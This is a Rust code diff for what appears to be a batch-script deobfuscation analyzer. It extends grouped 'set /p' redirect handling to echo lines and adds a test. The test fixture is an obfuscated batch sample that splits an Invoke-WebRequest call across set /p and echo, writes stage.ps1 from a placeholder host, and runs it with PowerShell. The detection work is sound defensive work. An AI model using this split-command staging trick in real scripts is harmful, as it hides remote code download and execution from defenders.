@@ -14138,7 +14138,8 @@ fn capture_block_set_p_redirects(
 
         let mut j = i + 1;
         let mut content = Vec::new();
-        let mut body_is_all_set_p = true;
+        let mut body_is_supported = true;
+        let mut saw_set_p = false;
         let mut close_idx: Option<usize> = None;
         while j < lines.len() {
             let body = lines[j].trim_start_matches(['@', ' ', '\t']);
@@ -14154,8 +14155,18 @@ fn capture_block_set_p_redirects(
             let (cleaned, _) = crate::redirect::extract_redirections(body_trimmed);
             if let Some(bytes) = crate::synth::run_pipeline_bytes(cleaned.trim(), &mut scratch) {
                 content.extend_from_slice(&bytes);
+                saw_set_p = true;
+            } else if let Some(payload) = block_echo_payload(cleaned.trim()) {
+                if payload.contains('%') || payload.contains('!') {
+                    let toks = lex::lex(payload);
+                    let expanded = normalize::normalize_to_string(&toks, &mut scratch);
+                    content.extend_from_slice(expanded.as_bytes());
+                } else {
+                    content.extend_from_slice(payload.as_bytes());
+                }
+                content.extend_from_slice(b"\r\n");
             } else {
-                body_is_all_set_p = false;
+                body_is_supported = false;
                 break;
             }
             j += 1;
@@ -14165,7 +14176,7 @@ fn capture_block_set_p_redirects(
             i += 1;
             continue;
         };
-        if !body_is_all_set_p || content.is_empty() {
+        if !body_is_supported || !saw_set_p || content.is_empty() {
             i = close + 1;
             continue;
         }
@@ -23420,6 +23431,31 @@ powershell -NoProfile -File .\stage.ps1"#,
                 )
             }),
             "grouped set /p prompt redirection did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn grouped_mixed_set_p_echo_redirect_joins_generated_script() {
+        let report = crate::analyze(
+            br#"(
+<nul set /p "=Invoke-WebRequest -Uri h"
+echo ttps://grouped-mixed-set-p-echo.example/stage.ps1
+) > stage.ps1
+powershell -NoProfile -File .\stage.ps1"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::Download { src, .. }
+                        if src == "https://grouped-mixed-set-p-echo.example/stage.ps1"
+                )
+            }),
+            "grouped mixed set /p and echo redirection did not analyze generated script: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
